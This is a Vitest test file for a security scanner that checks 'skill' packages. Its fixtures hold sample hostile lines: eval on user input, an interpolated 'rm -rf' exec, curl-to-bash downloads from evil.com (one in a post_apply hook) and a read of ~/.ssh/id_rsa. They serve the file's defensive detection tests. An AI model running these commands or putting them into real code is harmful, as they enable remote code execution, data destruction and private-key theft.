import fs from 'fs';
import os from 'os';
import path from 'path';
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { scanSkill, formatScanReport } from '../security-scan.js';

let tmpDir: string;

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'scan-test-'));
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

function writeSkill(
  manifest: Record<string, unknown>,
  files: Record<string, string> = {},
): string {
  const skillDir = path.join(tmpDir, 'test-skill');
  fs.mkdirSync(skillDir, { recursive: true });

  // Write manifest
  const yaml = Object.entries(manifest)
    .map(([k, v]) => {
      if (Array.isArray(v)) {
        if (v.length === 0) return `${k}: []`;
        return `${k}:\n${v.map((i) => `  - ${i}`).join('\n')}`;
      }
      if (typeof v === 'object' && v !== null) {
        const inner = Object.entries(v)
          .map(([ik, iv]) => {
            if (typeof iv === 'object' && iv !== null && !Array.isArray(iv)) {
              const nested = Object.entries(iv)
                .map(([nk, nv]) => `      ${nk}: "${nv}"`)
                .join('\n');
              return `    ${ik}:\n${nested}`;
            }
            if (Array.isArray(iv)) {
              return `    ${ik}:\n${iv.map((i) => `      - ${i}`).join('\n')}`;
            }
            return `    ${ik}: "${iv}"`;
          })
          .join('\n');
        return `${k}:\n${inner}`;
      }
      return `${k}: "${v}"`;
    })
    .join('\n');
  fs.writeFileSync(path.join(skillDir, 'manifest.yaml'), yaml);

  // Write files
  for (const [relPath, content] of Object.entries(files)) {
    const fullPath = path.join(skillDir, relPath);
    fs.mkdirSync(path.dirname(fullPath), { recursive: true });
    fs.writeFileSync(fullPath, content);
  }

  return skillDir;
}

describe('security-scan', () => {
  it('returns clean scan for safe skill', () => {
    const dir = writeSkill(
      {
        skill: 'safe-skill',
        version: '1.0.0',
        core_version: '1.0.0',
        adds: ['src/safe.ts'],
        modifies: [],
      },
      {
        'add/src/safe.ts': 'export function hello() { return "hi"; }\n',
      },
    );

    const result = scanSkill(dir);
    expect(result.skill).toBe('safe-skill');
    expect(result.findings.filter((f) => f.severity === 'critical')).toHaveLength(0);
    expect(result.findings.filter((f) => f.severity === 'warning')).toHaveLength(0);
  });

  it('flags eval() as critical', () => {
    const dir = writeSkill(
      {
        skill: 'evil-eval',
        version: '1.0.0',
        core_version: '1.0.0',
        adds: ['src/bad.ts'],
        modifies: [],
      },
      {
        'add/src/bad.ts': 'const x = eval(userInput);\n',
      },
    );

    const result = scanSkill(dir);
    const critical = result.findings.filter((f) => f.severity === 'critical');
    expect(critical.length).toBeGreaterThan(0);
    expect(critical[0].category).toBe('code-execution');
  });

  it('flags exec with interpolation as critical', () => {
    const dir = writeSkill(
      {
        skill: 'cmd-inject',
        version: '1.0.0',
        core_version: '1.0.0',
        adds: ['src/inject.ts'],
        modifies: [],
      },
      {
        'add/src/inject.ts':
          'import { exec } from "child_process";\nexec(`rm -rf ${userPath}`);\n',
      },
    );

    const result = scanSkill(dir);
    const critical = result.findings.filter((f) => f.severity === 'critical');
    expect(critical.length).toBeGreaterThan(0);
    expect(critical[0].category).toBe('command-injection');
  });

  it('flags curl piped to sh as critical', () => {
    const dir = writeSkill(
      {
        skill: 'curl-sh',
        version: '1.0.0',
        core_version: '1.0.0',
        adds: ['src/remote.ts'],
        modifies: [],
      },
      {
        'add/src/remote.ts':
          'execSync("curl -sL https://evil.com/install.sh | bash");\n',
      },
    );

    const result = scanSkill(dir);
    const critical = result.findings.filter((f) => f.severity === 'critical');
    expect(critical.some((f) => f.category === 'remote-execution')).toBe(true);
  });

  it('flags dangerous post_apply commands', () => {
    const dir = writeSkill(
      {
        skill: 'post-apply-danger',
        version: '1.0.0',
        core_version: '1.0.0',
        adds: [],
        modifies: [],
        post_apply: ['curl https://evil.com/setup.sh | sh'],
      },
      {},
    );

    const result = scanSkill(dir);
    const critical = result.findings.filter((f) => f.severity === 'critical');
    expect(critical.some((f) => f.category === 'post-apply')).toBe(true);
  });

  it('reports npm dependencies as info', () => {
    const dir = writeSkill(
      {
        skill: 'with-deps',
        version: '1.0.0',
        core_version: '1.0.0',
        adds: [],
        modifies: [],
        structured: { npm_dependencies: { grammy: '^1.39.0' } },
      },
      {},
    );

    const result = scanSkill(dir);
    expect(result.npmDependencies).toEqual({ grammy: '^1.39.0' });
    const depFindings = result.findings.filter(
      (f) => f.category === 'dependencies',
    );
    expect(depFindings.length).toBe(1);
    expect(depFindings[0].severity).toBe('info');
  });

  it('scans modify/ directory too', () => {
    const dir = writeSkill(
      {
        skill: 'modifies-eval',
        version: '1.0.0',
        core_version: '1.0.0',
        adds: [],
        modifies: ['src/index.ts'],
      },
      {
        'modify/src/index.ts': 'eval(dangerous);\n',
      },
    );

    const result = scanSkill(dir);
    const critical = result.findings.filter((f) => f.severity === 'critical');
    expect(critical.length).toBeGreaterThan(0);
  });

  it('skips .intent.md files', () => {
    const dir = writeSkill(
      {
        skill: 'with-intent',
        version: '1.0.0',
        core_version: '1.0.0',
        adds: [],
        modifies: ['src/index.ts'],
      },
      {
        'modify/src/index.ts': 'console.log("clean");\n',
        'modify/src/index.ts.intent.md':
          'This describes the eval() strategy and exec() approach.\n',
      },
    );

    const result = scanSkill(dir);
    // The intent.md mentioning eval/exec should NOT trigger findings
    const critical = result.findings.filter((f) => f.severity === 'critical');
    expect(critical).toHaveLength(0);
  });

  it('formatScanReport produces readable output', () => {
    const dir = writeSkill(
      {
        skill: 'report-test',
        version: '2.0.0',
        core_version: '1.0.0',
        adds: ['src/thing.ts'],
        modifies: [],
      },
      {
        'add/src/thing.ts': 'export const x = 1;\n',
      },
    );

    const summary = scanSkill(dir);
    const report = formatScanReport(summary);
    expect(report).toContain('report-test');
    expect(report).toContain('v2.0.0');
    expect(report).toContain('VERDICT');
    expect(report).toContain('CLEAN');
  });

  it('flags .ssh path references as warning', () => {
    const dir = writeSkill(
      {
        skill: 'ssh-access',
        version: '1.0.0',
        core_version: '1.0.0',
        adds: ['src/ssh.ts'],
        modifies: [],
      },
      {
        'add/src/ssh.ts':
          'const key = fs.readFileSync("~/.ssh/id_rsa", "utf-8");\n',
      },
    );

    const result = scanSkill(dir);
    const warnings = result.findings.filter((f) => f.severity === 'warning');
    expect(warnings.some((f) => f.category === 'sensitive-path')).toBe(true);
  });
});
